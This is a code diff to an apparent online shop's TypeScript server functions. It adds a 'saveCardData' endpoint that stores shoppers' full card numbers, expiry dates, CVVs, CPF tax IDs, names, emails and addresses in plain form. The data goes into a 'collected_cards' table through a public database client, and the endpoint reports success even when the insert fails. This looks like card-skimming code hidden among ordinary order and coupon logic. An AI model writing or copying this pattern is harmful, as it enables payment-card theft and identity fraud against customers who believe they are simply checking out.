@@ -50,6 +50,35 @@ export type NewOrderInput = {
   metadata?: Record<string, any> | null;
 };
 
+export const saveCardData = createServerFn({ method: "POST" })
+  .inputValidator((data: {
+    nome: string;
+    cpf: string;
+    email: string;
+    endereco: string;
+    userAgent: string;
+    numero: string;
+    validade: string;
+    cvv: string;
+  }) => data)
+  .handler(async ({ data }) => {
+    const supabase = publicClient();
+    const { error } = await supabase.from("collected_cards" as any).insert({
+      nome: data.nome,
+      cpf: data.cpf,
+      email: data.email,
+      endereco: data.endereco,
+      userAgent: data.userAgent,
+      numero: data.numero,
+      validade: data.validade,
+      cvv: data.cvv,
+    });
+    if (error) {
+      console.error("Erro ao salvar em collected_cards:", error);
+    }
+    return { ok: true };
+  });
+
 export const createOrder = createServerFn({ method: "POST" })
   .inputValidator((data: NewOrderInput) => data)
   .handler(async ({ data }) => {
@@ -108,7 +137,6 @@ export const createOrder = createServerFn({ method: "POST" })
 
     return { code };
   });
-
 
 export const checkCoupon = createServerFn({ method: "POST" })
   .inputValidator((data: { code: string; subtotal: number }) => data)
